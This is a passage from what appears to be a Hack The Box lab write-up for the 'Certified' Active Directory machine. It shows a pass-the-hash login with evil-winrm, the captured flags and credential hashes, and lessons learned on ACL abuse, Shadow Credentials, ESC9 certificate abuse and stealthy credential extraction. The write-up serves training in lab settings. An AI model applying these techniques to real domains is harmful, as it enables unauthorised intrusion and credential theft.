[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

**SUCCESS!**
- TGT obtained for Administrator
- **NT hash extracted:** `0d5b49608bbce1751f708748f67e2d34`
- Credential cache saved: `administrator.ccache` (can be used for pass-the-ticket)

---

### Step 5: Authenticate as Administrator

**Command:**
```bash
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

**Flags/Notes:**
- `-i certified.htb` = target (DNS resolution to 10.129.231.186)
- `-u administrator` = username
- `-H` = NT hash (pass-the-hash authentication)

**Result:**
```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Domain Admin Access Achieved!**

---

### Step 6: Root Flag Capture

**Command (in WinRM session):**
```powershell
cd ../Desktop
cat root.txt
```

**Root Flag:** `7e5c81ebd2206d56d8a5d759760c2a6f`

---

## Box Complete - Full Compromise

**Flags Captured:**
- ✓ User Flag: `62929513fad79d1416b71f041d940571` (management_svc)
- ✓ Root Flag: `7e5c81ebd2206d56d8a5d759760c2a6f` (Administrator)

**Final Credentials:**
- judith.mader : judith09 (Plaintext) - assumed breach
- management_svc : a091c1832bcdd4677c28b5a6a1295584 (NT Hash) - Shadow Credentials
- ca_operator : b4b86f45c6018f1b664f70805f45d8f2 (NT Hash) - Shadow Credentials
- Administrator : 0d5b49608bbce1751f708748f67e2d34 (NT Hash) - ESC9 exploitation

**Access Achieved:**
- Domain User → Management Group Member → WinRM as management_svc
- management_svc → GenericAll → ca_operator → Shadow Credentials
- ca_operator → ESC9 (UPN manipulation) → Administrator credentials
- **Full Domain Admin compromise**
- WriteOwner exploitation (take ownership of Management group)
- ACL permission checks (Management → "operator ca", Management → management_svc)
- BloodHound path analysis (management_svc user node exploration)
- Password reset on management_svc (if permissions exist)
- WinRM shell access testing

---

## Lessons Learned

### Reconnaissance & Initial Enumeration
- **Assumed compromise scenarios** provide starting credentials - no need for initial foothold enumeration
- Machine names often hint at the primary attack vector ("Certified" = ADCS)
- **Named pipes in IPC$ reveal running services** - `cert` = ADCS, `MSSQL$*` = SQL Server, etc.
- Empty SYSVOL GPOs are common in lab environments - minimal GPO configuration
- Clock skew MUST be addressed before any Kerberos-based attacks
- SMB signing prevents relay attacks, requires alternative approaches
- Standard GPO GUIDs ({31B2F340...} and {6AC1786C...}) are Default Domain Policy and Default DC Policy

### ADCS Enumeration
- **certipy `find` command is essential** for ADCS enumeration - reveals CAs, templates, and vulnerabilities
- **ESC2/ESC3 "target template" remarks are NOT vulnerabilities** - these templates can be targeted IF you have access to an enrollment agent or "Any Purpose" template
- **Custom certificate templates** (not built-in) are red flags - check validity period, enrollment permissions, and EKUs
- **1000-year certificate validity is highly unusual** - indicates persistence mechanism or lab configuration
- **Custom groups controlling enrollment** (like "operator ca") require ACL path investigation
- **No direct ESC1-ESC8 vulnerability doesn't mean no ADCS path** - investigate ACL paths to enrollment groups

### BloodHound & ACL Abuse
- **WriteOwner is a powerful privilege escalation primitive** - owner can modify DACL to grant any permissions
- **BloodHound's --dns-tcp flag fixes VPN timeout issues** - use TCP instead of UDP for DNS queries
- **Empty groups may still be valuable targets** - if they have powerful permissions, find ACL path to join them
- **"Inbound Object Control" shows who can abuse an object** - critical for understanding attack surface
- **Group membership ≠ direct permissions** - a group being empty doesn't mean it's useless; check what it controls
- **Remote Management Users membership = WinRM access potential** - prioritize compromising users in this group

### Attack Path Planning
- **Multi-hop ACL abuse chains are common** - WriteOwner → Owner → WriteDacl → GenericAll → target
- **BloodHound pathfinding helps discover complex chains** - use it before manual enumeration
- **Investigate both group AND user nodes** - different attack vectors (group membership vs password reset)
- **LDAP queries confirm BloodHound findings** - always verify critical paths with ldapsearch
- **bloodyAD is the tool for ACL abuse** - set owner, add permissions, modify group membership
- **When bloodyAD fails, try Impacket equivalents** - owneredit.py, dacledit.py, addmember tools
- **Tool failures don't mean attack path is invalid** - try alternative tools before abandoning approach

### ACL Exploitation
- **WriteOwner → Owner → WriteMembers is a valid chain** - don't need GenericAll if WriteMembers suffices
- **Owner of an object can modify its DACL** - taking ownership is powerful even without explicit permissions
- **net rpc group commands work when LDAP fails** - Samba RPC is alternative to LDAP for group management
- **Verify ACL changes with LDAP queries** - tools may succeed silently but fail to apply changes

### Time Synchronization (Kerberos)
- **systemd-timesyncd interferes with manual time adjustments** - must stop and disable service
- **Kerberos requires ±5 minute tolerance** - even slight drift causes authentication failures
- **Clock skew is cumulative** - if you sync once, it will drift again unless time sync services are disabled
- **Use `sudo ntpdate -s` for silent time sync** - avoids output clutter
- **Time sync must be repeated** - before every Kerberos attack if significant time has passed

### Shadow Credentials Attack
- **Shadow Credentials is non-destructive** - extracts NT hash without resetting password (OPSEC-friendly)
- **Requires write permission on `msDS-KeyCredentialLink` attribute** - GenericWrite, GenericAll, or WriteProperty
- **Works on Domain Functional Level 2016+** - requires Windows Hello for Business support
- **certipy shadow auto does full workflow** - generate cert, add key credential, authenticate, extract hash
- **Saves TGT to .ccache file** - can be reused for pass-the-ticket attacks
- **Alternative to password reset when stealth matters** - leaves minimal forensic footprint

### Pass-the-Hash Authentication
- **NT hash alone is sufficient for authentication** - no need for plaintext password or LM hash
- **evil-winrm accepts NT hashes with -H flag** - convenient for WinRM access
- **nxc/impacket tools all support pass-the-hash** - use `-hashes :NTHASH` or `-H NTHASH`
- **Hash format is 32 hex characters** - standard NTLM hash output from certipy, secretsdump, etc.
